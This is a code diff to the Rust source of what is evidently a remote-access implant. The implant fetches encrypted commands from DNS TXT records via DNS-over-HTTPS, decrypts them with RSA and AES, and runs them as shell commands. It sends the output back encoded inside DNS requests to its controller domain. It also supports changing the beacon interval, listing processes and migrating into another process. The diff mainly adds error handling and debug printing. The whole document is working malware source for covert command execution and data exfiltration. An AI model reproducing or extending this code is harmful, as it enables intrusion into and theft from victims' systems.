@@ -256,34 +256,44 @@ fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey, pub
         .append_pair("type", "TXT");
     let client = reqwest::blocking::Client::new();
     let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();
-    let mut response = request.unwrap();
-    let mut data = response.text().unwrap();
 
-    result.clear();
+    match request{
+        Ok(req) => {
+            let mut response = req;
+            let mut data = response.text().unwrap();
 
-    let mut ndata = parseDNSTextEntry(&data);
+            result.clear();
 
-    let bFlag = is_base32(&ndata);
-    if bFlag == false{
-        // println!("Data :: {}",&ndata);
-        let commandDecoded = &base64::decode(ndata).unwrap();
-        let padding = Oaep::new::<sha2::Sha256>();
-        let dec_data = private_key_internal.decrypt(padding, &commandDecoded);
-        match dec_data{
-            Ok(dec_data) =>{
-                let utf_data = String::from_utf8(dec_data).unwrap();
-                let new_string: String = utf_data.to_owned();
-                let parts: Vec<String> = new_string.split('|').map(|s| s.to_string()).collect();
-                return parts;
-            }
-            Err(err)=>{
-                println!("Error! {}", err);
-                return vec![]
-            }
+            let mut ndata = parseDNSTextEntry(&data);
+
+            let bFlag = is_base32(&ndata);
+            if bFlag == false{
+                // println!("Data :: {}",&ndata);
+                let commandDecoded = &base64::decode(ndata).unwrap();
+                let padding = Oaep::new::<sha2::Sha256>();
+                let dec_data = private_key_internal.decrypt(padding, &commandDecoded);
+                match dec_data{
+                    Ok(dec_data) =>{
+                        let utf_data = String::from_utf8(dec_data).unwrap();
+                        let new_string: String = utf_data.to_owned();
+                        let parts: Vec<String> = new_string.split('|').map(|s| s.to_string()).collect();
+                        println!("parts :: {:?}", &parts);
+                        return parts;
+                    }
+                    Err(err)=>{
+                        println!("Error! {}", err);
+                        return vec![]
+                    }
+                }
+            }            
+            ndata.clear();
+            return vec![];
+        }
+
+        Err(_) => {
+            return vec![];
         }
     }
-    ndata.clear();
-    return vec![];
 }
 
 fn migrateProcessToPID(procPID: &str) -> &str{
@@ -349,63 +359,68 @@ fn commandExec(public_key_hash: &str, domain: &str, aes_key: &str, private_key_i
     let mut data = response.text().unwrap();
 
     let commandVec = parseDNSTextEntry(&data);
-
-    // println!("Read from TXT :: {:?}", &commandVec);
-    let commandDec = base32::decode(Alphabet::RFC4648 { padding: true }, &commandVec).unwrap();
-    let str2Dec = std::str::from_utf8(&commandDec).unwrap();
-    println!("test {}", &str2Dec);
-
-    let commandDec = base64::decode(&str2Dec);
-
-    let commandDec: Vec<u8> = match commandDec {
-        Ok(decoded) => {
-            decoded
-        }
-        Err(err) => {
-            println!("Erro na decodificação: {:?}", err);
-            Vec::new()
-        }
-    };
-    
-    if !commandDec.is_empty(){
-        let iv = &commandDec[..16];
-        let ciphertext = &commandDec[16..];
-    
-        println!("IV : {:?} | Ciphertext: {:?} | Key :: {:?}", &iv, &ciphertext, &key);
+    let commandDec = base32::decode(Alphabet::RFC4648 { padding: true }, &commandVec);
+    match commandDec{
+        Some(decValue) => {
+            let str2Dec = std::str::from_utf8(&decValue).unwrap();
+            let commandDec = base64::decode(&str2Dec);
         
-        let mut buf = ciphertext.to_vec();
-    
-        let cipher = Aes128ECfb::new_from_slices(&key, &iv).unwrap();
-        let decrypted_ciphertext = cipher.decrypt(&mut buf).unwrap();
-    
-        let commandStrFinalParts = str::from_utf8(&decrypted_ciphertext[16..]).unwrap();
-        let commandParts: Vec<&str> = commandStrFinalParts.split('|').collect();
-    
-        let commandToExec = commandParts.get(2).unwrap();
-    
-        println!("Command:: {}", &commandToExec);
-    
-    
-        //println!("Executing command! {}", commandStr);
-        let mut execCmd = command(commandToExec);
-        execCmd.stdout(Stdio::piped());
-        execCmd.stderr(Stdio::piped());
-        let output = execCmd.execute_output().unwrap();
-    
-        let s: String = format!("2c|{}", public_key_hash);
-        let data = format!("{}|{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
-    
-        let encData = dnsRequestEncryptEncode(&data, &key, &iv);
-        let encodedData = base64::encode(&encData);
+            let commandDec: Vec<u8> = match commandDec {
+                Ok(decoded) => {
+                    decoded
+                }
+                Err(err) => {
+                    println!("Erro na decodificação: {:?}", err);
+                    Vec::new()
+                }
+            };
+            
+            if !commandDec.is_empty(){
+                let iv = &commandDec[..16];
+                let ciphertext = &commandDec[16..];
+            
+                println!("IV : {:?} | Ciphertext: {:?} | Key :: {:?}", &iv, &ciphertext, &key);
+                
+                let mut buf = ciphertext.to_vec();
+            
+                let cipher = Aes128ECfb::new_from_slices(&key, &iv).unwrap();
+                let decrypted_ciphertext = cipher.decrypt(&mut buf).unwrap();
+            
+                let commandStrFinalParts = str::from_utf8(&decrypted_ciphertext[16..]).unwrap();
+                let commandParts: Vec<&str> = commandStrFinalParts.split('|').collect();
+        
+            
+                let commandToExec = commandParts.get(2).unwrap();
+            
+            
+            
+                //println!("Executing command! {}", commandStr);
+                let mut execCmd = command(commandToExec);
+                execCmd.stdout(Stdio::piped());
+                execCmd.stderr(Stdio::piped());
+                let output = execCmd.execute_output().unwrap();
+            
+                let s: String = format!("2c|{}", public_key_hash);
+                let data = format!("{}|{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
+            
+                let encData = dnsRequestEncryptEncode(&data, &key, &iv);
+                let encodedData = base64::encode(&encData);
+        
+                let max_payload = 1024 / 8 - 11;
+            
+            
+                let fData = format!("{}|{}", s, encodedData);
+            
+                println!("Sending... {}", &fData);
+                dnsRequestEncoder(domain, &fData);
+            }
+        }
 
-        let max_payload = 1024 / 8 - 11;
-    
-    
-        let fData = format!("{}|{}", s, encodedData);
-    
-        println!("Sending... {}", &fData);
-        dnsRequestEncoder(domain, &fData);
+        None => {
+
+        }
     }
+
 }
 
 
@@ -416,37 +431,37 @@ fn commandServerHandler(domain: &str, public_key_external: &RsaPublicKey, public
     unsafe{
         if let Some(ref mutex) = SleepTime{
             while true{
-		hint::spin_loop();
+		        hint::spin_loop();
                 let mut stime = mutex.lock().unwrap();
                 let timeout = Duration::from_secs(*stime);
 
                 let command = checkDNSTextEntry(&domain, &private_key_internal, &public_key_hash);
                 core::arch::x86_64::_mm_mfence();
-		if !command.is_empty(){
-                    match command.get(1).unwrap().as_str() {
-                        "a" => println!("o segundo elemento é um!"),
-                        "s" => {
-                                let s: String = format!("s|{}", public_key_hash);
-				core::arch::x86_64::_mm_mfence();
-                                dnsRequestEncoder(domain, &s);
-                               // println!("Data :: {}", command.get(2).unwrap().as_str());
-                                *stime = command.get(2).unwrap().parse().unwrap();
-                                std::mem::drop(stime);
+                if !command.is_empty(){
+                            match command.get(1).unwrap().as_str() {
+                                "a" => println!("o segundo elemento é um!"),
+                                "s" => {
+                                        let s: String = format!("s|{}", public_key_hash);
+                                        println!("Called sleep! {}", &s);
+                                        core::arch::x86_64::_mm_mfence();
+                                        dnsRequestEncoder(domain, &s);
+                                    // println!("Data :: {}", command.get(2).unwrap().as_str());
+                                        *stime = command.get(2).unwrap().parse().unwrap();
+                                        std::mem::drop(stime);
+                                    }
+                                "x" => println!("o segundo elemento é três!"),
+                                "m" => {
+                                    migrateProcessToPID(command.get(2).unwrap().as_str());
+                                },
+                                "l" => {
+                                    listRunningProcesses();
+                                },
+                                "c" => {
+                                    println!("Command exec - g0t key:: {:?}", &command);
+                                    commandExec(&public_key_hash, &domain, command.get(2).unwrap().as_str(), &private_key_internal);
+                                }
+                                _ => println!("o segundo elemento não é válido!"),
                             }
-                        "x" => println!("o segundo elemento é três!"),
-                        "m" => {
-                            migrateProcessToPID(command.get(2).unwrap().as_str());
-                        },
-                        "l" => {
-                            listRunningProcesses();
-                        },
-                        "c" => {
-                            println!("Data - all :: {:?}", &command);
-                            // commandExec(public_key_hash: &str, domain: &str, aes_key: &str, private_key_internal: &RsaPrivateKey)
-                            commandExec(&public_key_hash, &domain, command.get(2).unwrap().as_str(), &private_key_internal);
-                        }
-                        _ => println!("o segundo elemento não é válido!"),
-                    }
                 }
 
 		//let seconds = timeout.as_secs() as i64;
